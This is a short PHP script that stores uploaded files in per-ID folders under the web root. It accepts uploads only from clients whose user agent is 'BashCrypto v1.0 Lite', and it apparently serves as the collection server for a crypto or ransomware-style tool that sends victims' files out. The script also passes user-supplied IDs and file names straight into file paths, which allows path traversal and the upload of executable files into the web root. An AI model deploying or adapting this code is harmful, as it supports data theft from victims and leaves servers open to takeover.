<?php

  $userAgent = $_SERVER['HTTP_USER_AGENT'];
  $getTargetID = $_POST['unique_id'];
  $getFileInfo = $_POST['file_info'];

  $uploadDir = "/var/www/html/" . $getTargetID . "/";
  mkdir($uploadDir);
  chmod($uploadDir, 0755);
  
  if (isset($_POST['uploadFile'])) {
    if (isset($_POST['unique_id'])) {
      if ($userAgent == "BashCrypto v1.0 Lite") {
        if (!empty($_FILES['file'])) {
          if ($_FILES['file']['error'] > 0) {
            echo "Error: " . $_FILES['file']['error'];
          } else {
            move_uploaded_file($_FILES["file"]["tmp_name"], $uploadDir . $_FILES["file"]["name"]);
            
            if ($_FILES["file"]["name"] == "-") {
              if (isset($getFileInfo)) {
                rename($uploadDir . $_FILES["file"]["name"], $uploadDir . $getFileInfo);
              }
            }
          }
  
        } else {
          die("File not uploaded.");
        }
      }
    }
  } else {
    echo "Post - uploadFile not set";
  }

?>
